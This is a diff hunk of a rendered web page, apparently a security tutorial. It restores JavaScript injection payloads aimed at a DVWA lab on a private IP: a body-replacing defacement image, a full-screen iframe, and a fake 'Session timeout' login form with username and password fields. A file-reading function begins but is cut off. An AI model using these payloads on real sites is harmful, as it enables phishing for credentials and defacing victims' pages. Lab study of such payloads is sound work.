@@ -60,13 +60,13 @@
 </span></span></code></pre></td></tr></table></div></div><p>document.getElementById(&lsquo;main_menu&rsquo;).innerHTML = &ldquo;Hello!&rdquo;</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>**Modifying Content within the Body**  
 </span></span></code></pre></td></tr></table></div></div><p>document.getElementsByTagName(&lsquo;body&rsquo;)[0].innerHTML = &ldquo;&lt;img src="https://www.techworm.net/wp-content/uploads/2016/11/common-signs-youve-been-hacked-1.jpg" width="100%"/>&rdquo;
-document.getElementsByTagName(&lsquo;body&rsquo;)[0].innerHTML = &ldquo;&lt;iframe src="http://192.168.66.1/dvwa" width="100%" style="border: 0; position:fixed; top:0; left:0; right:0; bottom:0; width:100%; height:100% "/>&rdquo;</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+document.getElementsByTagName(&lsquo;body&rsquo;)[0].innerHTML = &ldquo;&lt;iframe src="http://192.168.66.1/dvwa" width="100%" style="border: 0; position:fixed; top:0; left:0; right:0; bottom:0; width:100%; height:100% "/></iframe>&rdquo;</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>**Creating a Fake Login**  
-</span></span></code></pre></td></tr></table></div></div><p>document.write(&rsquo;Session timeout. Please login again.&rsquo;);
-document.write(&rsquo;&rsquo;);
-document.write(&rsquo;&rsquo;);
+</span></span></code></pre></td></tr></table></div></div><p>document.write(&rsquo;<font color=red>Session timeout. Please login again.</font><br>&rsquo;);
+document.write(&rsquo;<input type=text placeholder=username></input><br>&rsquo;);
+document.write(&rsquo;<input type=password placeholder=password></input>&rsquo;);
 var string = &ldquo;Password submitted to hacker website. ;)&rdquo;;
-document.write(&rsquo; Login &rsquo;);</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+document.write(&rsquo;<button onclick=alert(string)> Login </button>&rsquo;);</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>**Accessing Local File Content**  
 </span></span></code></pre></td></tr></table></div></div><p>function readTextFile(file)
 {
